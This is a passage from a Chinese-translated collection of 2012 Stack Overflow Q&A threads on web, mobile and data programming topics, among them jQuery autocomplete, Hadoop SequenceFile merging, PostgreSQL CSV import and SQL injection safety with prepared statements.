<%}%> 
```

控制器代码如下：

```
[HttpGet]
public ActionResult GetProductName(int? categoryID)
{
    return Json(from p in pr.GetProductList() where p.CategoryID == 2 select new { ProductID = p.ProductID, ProductName = p.ProductName }, JsonRequestBehavior.AllowGet);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T23:14:49.940

如果您返回的 json 数据如下所示：

`[ { ProductID: 1, ProductName: "Red Hat" }, { ProductID: 2, ProductName: "Red Scarf" }]`

然后自动完成不知道要显示什么。

它需要一个值和/或标签字段。

尝试返回类似这样的数据：

`[ { value: 1, label: "Red Hat" }, { value: 2, label: "Red Scarf" }]`

也许有了这个改变（我不完全确定，但你应该明白）：

`return Json(from p in pr.GetProductList() where p.CategoryID == 2 select new { value = p.ProductID, label = p.ProductName }, JsonRequestBehavior.AllowGet);`

> > 标签属性显示在建议菜单中。当用户选择一个项目时，该值将被插入到输入元素中。如果只指定了一个属性，它将用于两者，例如，如果您只提供值属性，则该值也将用作标签。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-08T14:29:13.787

我修改了我的代码，如下所示，它完美无缺！谢谢“jk”。！！！

视图代码如下：

```
<head runat="server">
    <link href="../../Content/jquery-ui-1.8.14.custom.css" rel="stylesheet" type="text/css" />

    <script src="../../Scripts/jquery-1.6.2.min.js" type="text/javascript"></script>
    <script src="../../Scripts/jquery-ui-1.8.14.custom.min.js" type="text/javascript"></script>
</head>

<script type="text/ecmascript">
    $(document).ready(function () {
        $.ajax({
            type: "GET",
            url: "/Product/GetProductName/",
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            data: { categoryID: <%: Model.Select(o => o.Category.CategoryName).Distinct().Count() > 1 ? 0 : Model.FirstOrDefault().CategoryID %> },
            success: function(data) {
                if (data.length > 0) {
                    var dataFromServer = [];
                    for (i = 0 ; i < data.length; i++) {
                        dataFromServer[i] = data[i].ProductName;
                    }
                };
                $('#productNameSearch').autocomplete({
                    source: dataFromServer
                });
            },
            error: function (XMLHttpRequest, textStatus, errorThrown) {
                alert(textStatus);
            }
        });
    });
</script>

<% using (Html.BeginForm("ProductNameSearch", "Product", FormMethod.Post)) {%>
        <input type="text" id="productNameSearch" name="productNameSearch" style="width:300px" />&nbsp;
        <input type="submit" value="Go!" />
<%}%> 
```

控制器代码如下：

```
[HttpGet]
public ActionResult GetProductName(int? categoryID)
{
    Product product = new Product { CategoryID = categoryID };
    return Json(from p in pr.SearchProductList(product) select new { ProductName = p.ProductName }, JsonRequestBehavior.AllowGet);
} 
```

# audio - 警告：出于安全原因，_audioconverter_scheduler_ffmpeg_helper 已禁用 passthru()

> ID：13756663
> 
> 赞同：1
> 
> 时间：2012-12-07T03:56:05.103
> 
> 标签：audio, drupal-7, ffmpeg, audio-converter

我在我自己的运行 Aegir 和 Nginx 的 vps 上使用带有 ffmpeg 的 Drupal 7 中的 audioconverter 模块和 audiorecorderfield 模块。audioconverter 模块已停止将 wav 文件转换为 mp3。这是错误；

```
Warning: passthru() has been disabled for security reasons in _audioconverter_scheduler_ffmpeg_helper() (line 358 of /mysite/drupal-7.16/sites/all/modules/audioconverter/audioconverter.module). 
```

在我的日志中；

```
MESSAGE: executing: /usr/bin/ffmpeg -i /mysite/drupal-7.16/sites/default/files/1354856044.wav /mysite/drupal-7.16/sites/default/files/1354856044.wav.mp3

MESSAGE: Audio conversion failed. FFMPEG reported the following output: 

SEVERITY: error

MESSAGE: converted file is an empty file. 
```

我可以看到 wav 文件是由 audiorecorderfield 模块创建的，但 audioconverter 模块在转换时失败。

这是我的 ffmpeg 信息；

```
ffmpeg version 0.7.13, Copyright (c) 2000-2011 the FFmpeg developers
built on Jun 13 2012 14:01:54 with gcc 4.4.5
configuration: --enable-libdc1394 --prefix=/usr --extra-cflags='-Wall -g ' --cc='ccache cc' --enable-shared --enable-libmp3lame --enable-gpl --enable-libvorbis --enable-pthreads --enable-libfaac --enable-libxvid --enable-postproc --enable-x11grab --enable-libgsm --enable-libtheora --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libx264 --enable-libspeex --enable-nonfree --disable-stripping --enable-avfilter --enable-libdirac --disable-decoder=libdirac --enable-libfreetype --enable-libschroedinger --disable-encoder=libschroedinger --enable-version3 --enable-libopenjpeg --enable-libvpx --enable-librtmp --extra-libs=-lgcrypt --disable-altivec --disable-armv5te --disable-armv6 --disable-vis
libavutil    50\. 43\. 0 / 50\. 43\. 0
libavcodec   52.123\. 0 / 52.123\. 0
libavformat  52.111\. 0 / 52.111\. 0
libavdevice  52\.  5\. 0 / 52\.  5\. 0
libavfilter   1\. 80\. 0 /  1\. 80\. 0
libswscale    0\. 14\. 1 /  0\. 14\. 1
libpostproc  51\.  2\. 0 / 51\.  2\. 0
Hyper fast Audio and Video encoder
usage: ffmpeg [options] [[infile options] -i infile]... {[outfile options] outfile}... 
```

php.ini 中的安全模式已关闭，所以我不知道为什么 audioconverter 无法正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T14:41:18.363

通过从 php.ini 中的 disable_functions 中删除“passthru”来禁用 passthru 来解决

耶！

# ios - 像这样自定义 UITextField

> ID：13756664
> 
> 赞同：0
> 
> 时间：2012-12-07T03:56:08.477
> 
> 标签：ios, uitextfield

![在此处输入图像描述](../Images/a24760b44a0270917ecab4632ca80a2d.png)

我必须像上图那样自定义 UITextField，所以我尝试编写自定义类扩展 UITextField 类。但我的问题是：矩形的描边阴影轮廓，并在我的自定义代码中为文本字段设置白色背景是：

```
- (void)drawRect:(CGRect)rect
 {
  // Drawing code
     self.autocorrectionType = UITextAutocorrectionTypeNo;
     self.autocapitalizationType = UITextAutocapitalizationTypeNone;
     CALayer *layer = self.layer;
     layer.cornerRadius = 15.0;
     layer.masksToBounds = YES;
     layer.borderWidth = 1.0;
     layer.borderColor = [[UIColor colorWithRed:0 green:0 blue:0 alpha:1] CGColor];
     [layer setShadowColor: [[UIColor blackColor] CGColor]];
     [layer setShadowOpacity:1];
     [layer setShadowOffset: CGSizeMake(2.0, 2.0)];
     [self setClipsToBounds:NO];
     [self setContentVerticalAlignment:UIControlContentVerticalAlignmentCenter];
     [self setContentHorizontalAlignment:UIControlContentHorizontalAlignmentLeft];
 }
  - (CGRect)textRectForBounds:(CGRect)bounds {
          return CGRectMake(bounds.origin.x + 20, bounds.origin.y + 8,
                  bounds.size.width - 40, bounds.size.height - 16);
 }
 - (CGRect)editingRectForBounds:(CGRect)bounds {
          return [self textRectForBounds:bounds];
 } 
```

所以我的问题是：我缺少什么代码（这里设置了白色背景，为边框设置了轮廓阴影）感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:08:00.030

你先试试这个吗？
`self.textField.background = myUIImage;
self.textField.borderStyle = UITextBorderStyleNone;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:22:00.227

最后，我在阅读了一些教程后解决了我的问题，这是我编写的代码

```
- (void)drawRect:(CGRect)rect
{

     self.autocorrectionType = UITextAutocorrectionTypeNo;
     self.autocapitalizationType = UITextAutocapitalizationTypeNone;
     CALayer *layer = self.layer;
     layer.backgroundColor = [[UIColor whiteColor] CGColor];
     layer.cornerRadius = 15.0;
     layer.masksToBounds = YES;
     layer.borderWidth = 1.0;
     layer.borderColor = [[UIColor colorWithRed:0 green:0 blue:0 alpha:1] CGColor];
     [layer setShadowColor: [[UIColor blackColor] CGColor]];
     [layer setShadowOpacity:1];
     [layer setShadowOffset: CGSizeMake(0, 2.0)];
     [layer setShadowRadius:5];
     [self setClipsToBounds:NO];
     [self setContentVerticalAlignment:UIControlContentVerticalAlignmentCenter];
     [self setContentHorizontalAlignment:UIControlContentHorizontalAlignmentLeft];
  }
  - (CGRect)textRectForBounds:(CGRect)bounds {
        return CGRectMake(bounds.origin.x + 20, bounds.origin.y + 8,
                  bounds.size.width - 40, bounds.size.height - 16);
   }
  - (CGRect)editingRectForBounds:(CGRect)bounds {
        return [self textRectForBounds:bounds];
   } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:04:22.527

使用文本字段框的图像，并将其放在设置为自定义的普通 UITextField 后面，因此是透明的。这样您就可以获得文本字段功能，并且可以在其后面放置任何类型的图形。

# ruby - 如何在不专门删除 ruby 中的任何一个值的情况下摆脱重复项？

> ID：13756666
> 
> 赞同：2
> 
> 时间：2012-12-07T03:56:18.137
> 
> 标签：ruby

我以为这就是答案，但它仍然把三个留在里面。

```
array.uniq
# => ["0", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, "3"] 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T04:01:13.993

您可以传递`uniq`一个块，您可以使用它来转换项目以检查唯一性。

```
array.uniq {|i| i.to_s} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:01:22.900

您需要将元素转换为整数（或字符串）以进行比较：

```
array.map(&:to_i).uniq 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-07T06:04:18.697

也许你可以看看下面的方法

```
 ruby-1.9.3-p0 :020 > arr = ["0", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, "3"]
  => ["0", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, "3"] 
  ruby-1.9.3-p0 :021 > arr.map(&:to_i).uniq
  => [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
  ruby-1.9.3-p0 :022 > arr.uniq(&:to_i)
  => ["0", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
  ruby-1.9.3-p0 :023 > arr.uniq(&:to_s)
  => ["0", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
```

# redirect - 在未知页面上时，如何使其重定向回索引页面？

> ID：13756671
> 
> 赞同：0
> 
> 时间：2012-12-07T03:57:05.720
> 
> 标签：redirect, indexing, webpage, back

那么我该怎么做呢？

例子：

yourdomain.com

当有人像这样输入一个实际上并不存在的页面时

yourdomain.com/whatevertheytype yourdomain.com/whatevertheytype.php

等

那么，当用户位于服务器上什么都没有或什至没有的页面上时，我如何让它重定向回主页呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:00:36.537

您想设置一个 404 错误页面。详细信息会因您使用的服务器而异，但[这里有一些提示的链接](http://www.htaccessbasics.com/404-custom-error-page/)

# gcc - 如何使用配置脚本在 64 位机器/操作系统上构建静态 32 位二进制文 件？

> ID：13756674
> 
> 赞同：1
> 
> 时间：2012-12-07T03:57:11.313
> 
> 标签：gcc, x86, autotools, configure, automake

我正在尝试使用 automake 配置脚本在 64 位 CentOS 系统上构建静态链接的 GNU x86 二进制文件。我能够毫无问题地构建静态 64 位二进制文​​件和动态 32 位二进制文​​件，但我似乎无法弄清楚如何构建静态 32 位二进制文​​件。

我尝试了以下配置命令：

```
./configure --build=i686-pc-linux-gnu CFLAGS='-static -m32' CXXFLAGS='-static -m32' 
```

但我收到以下错误消息：

```
# ./configure --build=i686-pc-linux-gnu CFLAGS='-static -m32' CXXFLAGS='-static -m32'
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for gawk... gawk
checking whether make sets $(MAKE)... yes
checking for g++... g++
checking whether the C++ compiler works... no
configure: error: in `/tmp/iperf-2.0.5':
configure: error: C++ compiler cannot create executables
See `config.log' for more details. 
```

如果我尝试构建一个将 -m32 传递给 CFLAGS、CXXFLAGS 和 LDFLAGS 的 32 位二进制文​​件，它可以正常工作。

从 config.log 文件中，我看到：

```
configure:3104: $? = 1
configure:3124: checking whether the C++ compiler works
configure:3146: g++ -static -m32   conftest.cpp  >&5
/usr/bin/ld: cannot find -lstdc++
collect2: ld returned 1 exit status 
```

但我同时安装了 32 位和 64 位版本的 libstdc++。

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-08T11:17:34.893

对于典型的 autotools 配置，假设 libtool 已集成，请尝试：

```
> env CFLAGS="[OPT] -m32" CXXFLAGS="[OPT] -m32" \
  ./configure --host=i686-pc-linux-gnu --enable-static [--disable-shared] 
```

`OPT`其他编译器标志在哪里，例如，`-O2`等。

`-static`in的显式使用`$CFLAGS`，`$CXXFLAGS`可能没有做你想做的事。

**编辑：**实际上可能需要使用: `CC="gcc -m32"`, `CXX="g++ -m32"`（取决于编译器）以获得所需的模式以进行到链接阶段。我以前在使用其他软件包时遇到过这种情况。

# jquery - Jquery post数据没有到达控制器

> ID：13756677
> 
> 赞同：0
> 
> 时间：2012-12-07T03:57:20.510
> 
> 标签：jquery, ajax, asp.net-mvc

我有以下jquery

```
 $('#example').tableDnD({
    onDrop: function (table, row) {

        alert(JSON.stringify($('#example').tableDnDSerialize()));
        var data = JSON.stringify($('#example').tableDnDSerialize());

        $.post("/admin/ReorderNews", data, function (theResponse) {
            $("#response").html(theResponse);  
        });
    },
    dragHandle: ".dragHandle"
}); 
```

这是示例数据：`example[]=&example[]=1&example[]=2&example[]=`

当我将数据发布到时，我将表的信息存储在数据中`/admin/ReorderNews/`

如下：

```
 [HttpPost]
    public ActionResult ReorderNews(string data)
    {

        return Content("ok");
    } 
```

它返回确定。但是，当我调试时，我看到数据是`null`.

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:12:51.643

在 post 方法中尝试将数据作为 {"data":data} 并在 actionresult 中使用字符串数据。

```
 $.post("/admin/ReorderNews", {"data":data}, function (theResponse) {
        $("#response").html(theResponse);  
    }); 
```

谢谢

# hadoop - 在 Hadoop 中将多个序列文件合并为一个序列文件

> ID：13756678
> 
> 赞同：6
> 
> 时间：2012-12-07T03:57:23.293
> 
> 标签：hadoop, mapreduce

如何在 Hadoop 中将多个序列文件合并为一个序列文件 谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:31:36.447

如果要将多个文件合并为单个文件，那么这里有两个 ans ：

## 母语

* * *

```
getmerge 
```

用法：`hadoop fs -getmerge <src> <localdst>`

将源目录和目标文件作为输入，并将 src 中的文件连接到目标本地文件中。可选地 addnl 可以设置为在每个文件的末尾添加换行符。

* * *

* * *

## Java API

* * *

```
org.apache.hadoop.fs.FileUtil.copyMerge(FileSystem srcFS, Path srcDir, FileSystem dstFS, Path dstFile, boolean deleteSource, Configuration conf, String addString); 
```

将目录中的所有文件复制到一个输出文件（合并）

## 复制到hdfs

```
put 
```

用法：`hadoop dfs -put <localsrc> ... <dst>`

将单个 src 或多个 src 从本地文件系统复制到目标文件系统。还从标准输入读取输入并写入目标文件系统。

```
copyFromLocal 
```

用法：`hadoop dfs -copyFromLocal <localsrc> URI`

类似于 put 命令，只是源被限制为本地文件引用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-11T05:02:33.340

你考虑[过forqlift](http://www.exmachinatech.net/01/forqlift/)吗？我编写它是为了处理某些 SequenceFile 杂务，包括 SequenceFile 合并。

在您的情况下，您可以运行：

```
forqlift seq2seq --file new_combined_file.seq  \
    original_file1.seq  original_file2.seq original_file3.seq ... 
```

诚然，forqlift 的`seq2seq`工具被标记为“实验性”......但它在我的（诚然有限的）内部测试中运行良好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-07T04:13:25.300

如果您正在处理大量的序列文件，我建议您编写一个 MapReduce 作业，将[`Mapper`](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Mapper.html)用作您的映射器和[`Reducer`](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Reducer.html)减速器。对于 i/o 格式，使用[`SequenceFileInputFormat`](http://hadoop.apache.org/docs/stable/api/org/apache/hadoop/mapreduce/lib/input/SequenceFileInputFormat.html)和[`SequenceFileOutputFormat`](http://hadoop.apache.org/docs/stable/api/org/apache/hadoop/mapreduce/lib/output/SequenceFileOutputFormat.html)。[将 reducer 的数量设置](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Job.html#setNumReduceTasks%28int%29)为 1。这些都是您在驱动程序/主代码中的 Configuration 和 Job 对象中设置的所有内容。了解[如何设置输出格式](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Job.html#setOutputFormatClass%28java.lang.Class%29)，[如何设置输入格式](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Job.html#setInputFormatClass%28java.lang.Class%29)，[如何设置映射器](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Job.html#setMapperClass%28java.lang.Class%29)，以及[如何设置化简器](http://hadoop.apache.org/docs/r1.0.4/api/org/apache/hadoop/mapreduce/Job.html#setReducerClass%28java.lang.Class%29)。

请注意，`Mapper`and的默认行为`Reducer`是不对数据做任何事情——只是传递它。这就是为什么你不在这里编写 map 函数或 reduce 函数的原因。

这将做的是加载您的序列文件，对映射器中的数据不做任何事情，将所有记录洗牌到减速器，然后将它们全部输出到一个文件中。这确实具有对输出序列文件中的键进行排序的副作用。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-04-18T13:46:56.043

您**不能**将[hadoop getmerge](http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/FileSystemShell.html#getmerge)用于序列文件，因为它会将它们合并为二进制文件，而不是序列文件（因此您将在合并文件中获得很多标题，..）。

因此，您可以像@Donald-miner 建议的那样使用单个 reducer 编写一个小的 hadoop 作业，或者使用`SequenceFile.Reader`and编写一个独立的合并`SeuquenceFile.Writer`。

* * *

我选择了第二个选项，这是我的代码：

```
package ru.mail.go.webbase.markov.hadoop.utils;

import java.io.IOException;

import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.FileStatus;
import org.apache.hadoop.fs.FileSystem;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.hbase.HBaseConfiguration;
import org.apache.hadoop.io.SequenceFile;
import org.apache.hadoop.io.Writable;
import org.apache.hadoop.util.ReflectionUtils;

public class SequenceFilesUtils {
    private static final Configuration conf = HBaseConfiguration.create();

public static <K, V> void merge(Path fromDirectory, Path toFile, Class<K> keyClass, Class<V> valueClass) throws IOException {
    FileSystem fs = FileSystem.get(conf);

    if (!fs.isDirectory(fromDirectory)) {
        throw new IllegalArgumentException("'" + fromDirectory.toString() + "' is not a directory");
    }

    SequenceFile.Writer writer = SequenceFile.createWriter(
            conf,
            SequenceFile.Writer.file(toFile),
            SequenceFile.Writer.keyClass(keyClass),
            SequenceFile.Writer.valueClass(valueClass)
            );

    for (FileStatus status : fs.listStatus(fromDirectory)) {
        if (status.isDirectory()) {
            System.out.println("Skip directory '" + status.getPath().getName() + "'");
            continue;
        }

        Path file = status.getPath();

        if (file.getName().startsWith("_")) {
            System.out.println("Skip \"_\"-file '" + file.getName() + "'"); //There are files such "_SUCCESS"-named in jobs' ouput folders 
            continue;
        }

        System.out.println("Merging '" + file.getName() + "'");

        SequenceFile.Reader reader = new SequenceFile.Reader(conf, SequenceFile.Reader.file(file));
        Writable key = (Writable) ReflectionUtils.newInstance(reader.getKeyClass(), conf);
        Writable value = (Writable) ReflectionUtils.newInstance(reader.getValueClass(), conf);

        while (reader.next(key, value)) {
            writer.append(key, value);
        }

        reader.close();
    }

    writer.close();
}
} 
```

* * *

这是我的测试：

```
public class SequenceFilesUtilsTest {
private static final String OUT_PATH = "./UNIVERSE/SequenceFilesUtilsTest/";

@Before
public void initEnviroment() throws IOException {
    TestUtils.createDirectory(OUT_PATH);
    TestUtils.createDirectory(OUT_PATH + "/in");
}

@Test
public void test() throws Exception {
    Configuration conf = HBaseConfiguration.create();

    Path inPath1 = new Path("file://" + new File(OUT_PATH).getAbsolutePath() + "/in/in1.seq");
    System.out.println("Saving first part to '" + inPath1 + "'");
    SequenceFile.Writer writer1 = SequenceFile.createWriter(
            conf,
            SequenceFile.Writer.file(inPath1),
            SequenceFile.Writer.keyClass(LongWritable.class),
            SequenceFile.Writer.valueClass(Text.class)
            );
    writer1.append(new LongWritable(101), new Text("FIRST1"));
    writer1.append(new LongWritable(102), new Text("FIRST2"));
    writer1.append(new LongWritable(103), new Text("FIRST3"));
    writer1.append(new LongWritable(104), new Text("FIRST4"));
    writer1.close();

    Path inPath2 = new Path("file://" + new File(OUT_PATH).getAbsolutePath() + "/in/in2.seq");
    System.out.println("Saving second part to '" + inPath2 + "'");
    SequenceFile.Writer writer2 = SequenceFile.createWriter(
            conf,
            SequenceFile.Writer.file(inPath2),
            SequenceFile.Writer.keyClass(LongWritable.class),
            SequenceFile.Writer.valueClass(Text.class)
            );
    writer2.append(new LongWritable(201), new Text("SND1"));
    writer2.append(new LongWritable(202), new Text("SND2"));
    writer2.append(new LongWritable(203), new Text("SND3"));
    writer2.close();

    SequenceFilesUtils.merge(
            new Path("file://" + new File(OUT_PATH).getAbsolutePath() + "/in"),
            new Path("file://" + new File(OUT_PATH).getAbsolutePath() + "/merged.seq"),
            LongWritable.class,
            Text.class);

    Path mergedPath = new Path("file://" + new File(OUT_PATH).getAbsolutePath() + "/merged.seq");
    SequenceFile.Reader reader = new SequenceFile.Reader(conf, SequenceFile.Reader.file(mergedPath));
    LongWritable key = (LongWritable) ReflectionUtils.newInstance(reader.getKeyClass(), conf);
    Text value = (Text) ReflectionUtils.newInstance(reader.getValueClass(), conf);

    reader.next(key, value);
    Assert.assertEquals(101, key.get());
    Assert.assertEquals("FIRST1", value.toString());

    reader.next(key, value);
    Assert.assertEquals(102, key.get());
    Assert.assertEquals("FIRST2", value.toString());

    reader.next(key, value);
    Assert.assertEquals(103, key.get());
    Assert.assertEquals("FIRST3", value.toString());

    reader.next(key, value);
    Assert.assertEquals(104, key.get());
    Assert.assertEquals("FIRST4", value.toString());

    reader.next(key, value);
    Assert.assertEquals(201, key.get());
    Assert.assertEquals("SND1", value.toString());

    reader.next(key, value);
    Assert.assertEquals(202, key.get());
    Assert.assertEquals("SND2", value.toString());

    reader.next(key, value);
    Assert.assertEquals(203, key.get());
    Assert.assertEquals("SND3", value.toString());

    reader.close();
}
} 
```

# database - postgresql导入csv文件

> ID：13756682
> 
> 赞同：4
> 
> 时间：2012-12-07T03:57:43.183
> 
> 标签：database, postgresql

我需要将 csv 文件上传到 postgresql 数据库表。csv文件如

```
A           B               C       D               E       F

16777216    16777471        AU      AUSTRALIA       OC      OCEANIA
16777472    16778239        CN      CHINA           AS      ASIA
16778240    16779263        AU      AUSTRALIA       OC      OCEANIA
16779264    16781311        CN      CHINA           AS      ASIA 
```

桌子是

```
CREATE TABLE ipligence
(
  ip_from numeric(11,0) NOT NULL DEFAULT 0,
  ip_to numeric(11,0) NOT NULL DEFAULT 0,
  country_code character varying(10)[] NOT NULL,
  country_name character varying(225)[] NOT NULL,
  continent_code character varying(10)[] NOT NULL,
  continent_name character varying(255)[] NOT NULL,
  CONSTRAINT ipligence_pkey PRIMARY KEY (ip_to )
 )
WITH (
  OIDS=FALSE
 );
ALTER TABLE ipligence 
```

我在 pgsql 中使用复制命令，

```
copy ipligence 
from '/home/pgsql/ipligence-lite.csv' 
delimiter as ',' 
csv quote as '"'; 
```

但它显示

```
 ERROR:  array value must start with "{" or dimension information
  CONTEXT:  COPY ipligence, line 1, column country_code: "AU" 
```

我怎样才能成功地将 csv 文件输入到 postgresql 数据库中。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T04:40:56.783

您的表创建不正确。例如，此列声明：

```
country_code character varying(10)[] NOT NULL, 
```

正在创建一个 varchar(10) 数组。你只想要一个。将`[]`放在那些列上。

此外，您发布的示例数据实际上不是逗号分隔的，但我假设实际数据文件是。

# php - 这种存储方法sql注入“安全”吗？

> ID：13756683
> 
> 赞同：2
> 
> 时间：2012-12-07T03:57:44.480
> 
> 标签：php, mysql, sql, mysqli

我刚刚从头开始编写自己的 php 注册脚本，由于我是新手，所以我想问一下我使用的方法是否可以防止 sql 注入？

这是我如何与我的 sql 数据库交换数据的示例：

```
public function StoreUser($name, $email, $password, $devid) {

    $mysqli = new mysqli("host", "user", "pass", "data");
    if ($mysqli->connect_errno) {
        echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
    }

    $unique_id = uniqid('', true);
    $hash = $this->hashSSHA($password);

    $add_user = $mysqli->prepare("INSERT INTO `users` SET `unique_id`=?, `name`=?, `email`=?, `encrypted_password`=?, `salt`=?, `devid`=?, `created_at`=?");
    $add_user->bind_param("sssssss",$unique_id,$name,$email,$hash["encrypted"],$hash["salt"],$devid,date("H:i:s"));
    if ($add_user->execute()) {
        $add_user->close();
        $mysqli->close();
        return true;
    } 
    else {
        $add_user->close();
        $mysqli->close();
        return false;
    }

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:00:57.567

是的，它是安全的。

您正在使用从根本上将数据与命令分开的参数化查询，从而使您免受一阶 SQL 注入攻击。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:04:35.440

使用[适当的 SQL 占位符](http://bobby-tables.com/php)是确保应用程序安全的重要第一步。在这种情况下，您不必担心任何 SQL 注入错误，如果您对*任何*和*所有*用户提供的数据使用占位符有纪律，则应该为您完成转义，但可能存在其他问题。

请记住，就像您为 SQL 语句转义一样，您同样应该在将用户提供的数据显示为 HTML 之前谨慎地转义它，否则您最终可能会遇到各种问题，其中最糟糕的是[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)。

无论如何，[PDO](http://net.tutsplus.com/tutorials/php/why-you-should-be-using-phps-pdo-for-database-access/)使转义变得容易得多。`mysqli`通常仅在 PDO 不可用时使用。

没有单一的灵丹妙药，但是您可以采取许多措施来防止您的应用程序被滥用，或者只是遭受令人尴尬的错误。但是，如果您正在编写自己的低级数据库接口代码而不是使用框架，这可能很难做到。您将花费大量时间重新发明轮子。

# python - Youtube Python API：登录状态

> ID：13756684
> 
> 赞同：0
> 
> 时间：2012-12-07T03:57:49.413
> 
> 标签：python, youtube-api

我正在使用示例代码登录 youtube：

```
def auth(email, password):
# Setup service.
    yt_service = gdata.youtube.service.YouTubeService()
    yt_service.email = email
    yt_service.password = password
    yt_service.source = 'youtube_interface'
    yt_service.developer_key = DEVELOPER_KEY

    # Login.
    yt_service.ProgrammaticLogin()

    return yt_service 
```

请告诉我，我怎样才能知道登录是否成功？以及如何注销？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T22:02:31.213

如果您正在使用 Python 进行新开发，我建议您改用 API 的 v3。您使用的旧版 Python 客户端库已经有一段时间没有更新了，并且仍然与 API 的 v1 相冲突。[在https://developers.google.com/youtube/v3/code_samples/python](https://developers.google.com/youtube/v3/code_samples/python)上有一些使用 Python 和 v3 的代码示例

话虽如此，回答您的问题，如果 ClientLogin 尝试失败，客户端库将引发错误。而且我不知道以编程方式使 ClientLogin 令牌无效以“注销”的方法。令牌将在几个小时后过期。

# jquery - 如何使用 jQuery 选择具有特定条件的 p 标签内的文本？

> ID：13756686
> 
> 赞同：0
> 
> 时间：2012-12-07T03:58:11.640
> 
> 标签：jquery, dynamic, text, substring, contain

文本看起来像这样。

```
var fi,se,en;
var description = 
"<p>
FI: Sähköpyörä, Tunturi<br />
SE: Elektrisk Cykel, Tunturi<br />
EN: Electric Bike, Tunturi<br />
<\/p>"; 
```

我想在 FI: 之后选择 p 标签内的所有内容：直到标签 br 与 SE: 和 EN: 相同

结果会是这样。

```
var fi = "Sähköpyörä, Tunturi";

var se = "Elektrisk Cykel, Tunturi";

var en = "Electric Bike, Tunturi"; 
```

注：文字为动态变化。

谢谢 ！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:06:59.717

使用一些正则表达式怎么样

```
var fi,se,en;
var description = 
"<p>\
FI: Sähköpyörä, Tunturi<br />\
SE: Elektrisk Cykel, Tunturi<br />\
EN: Electric Bike, Tunturi<br />\
</p>";
var match = description.match(/FI:\s*(.+)<br \/>\s*SE:\s*(.+)<br \/>\s*EN:\s*(.+)<br \/>/);
fi = match[1];
se = match[2];
en = match[3]; 
```

[http://jsfiddle.net/mowglisanu/VGSaW/](http://jsfiddle.net/mowglisanu/VGSaW/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:46:33.037

使用 split 将 sting 分解为数组：

```
 var fi,se,en;
    var description = 
    "<p>\
    FI: Sähköpyörä, Tunturi<br />\
    SE: Elektrisk Cykel, Tunturi<br />\
    EN: Electric Bike, Tunturi<br />\
    </p>";

    bits = $(description).html().split(/:|<br>/); 
```

**输出**

```
 array["FI", " Sähköpyörä, Tunturi", "SE", " Elektrisk Cykel, Tunturi", "EN", " Electric Bike, Tunturi"] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T04:23:01.370

如果您可以安排将各个语言字符串包含在跨度中，那么您可以避免使用正则表达式。

```
var description = '<p>FI: <span class="fi">Sähköpyörä, Tunturi</span><br/>SE: <span class="se">Elektrisk Cykel, Tunturi<br/>EN: <span class="en">Electric Bike, Tunturi<br/></p>';
var $desc = $(description);
var fi = $desc.find(".fi").text();
var se = $desc.find(".se").text();
var en = $desc.find(".en").text(); 
```

# c# - 有什么理由为常数计算 INT？

> ID：13756691
> 
> 赞同：1
> 
> 时间：2012-12-07T03:58:41.680
> 
> 标签：c#, constants

在我继承的 pasketti 代码的另一部分中，我遇到了这个：

```
public const int SqlCommandTimeout = 60 * 10; 
```

有什么理由为什么这应该是一个计算值，然后放入一个常数？

我的 C# 培训一直在工作中，有一两本书作为备份，所以据我所知，这可能是有正当理由的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:01:51.043

它只是为了更具可读性：60 * 10 = 10 分钟。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:02:01.217

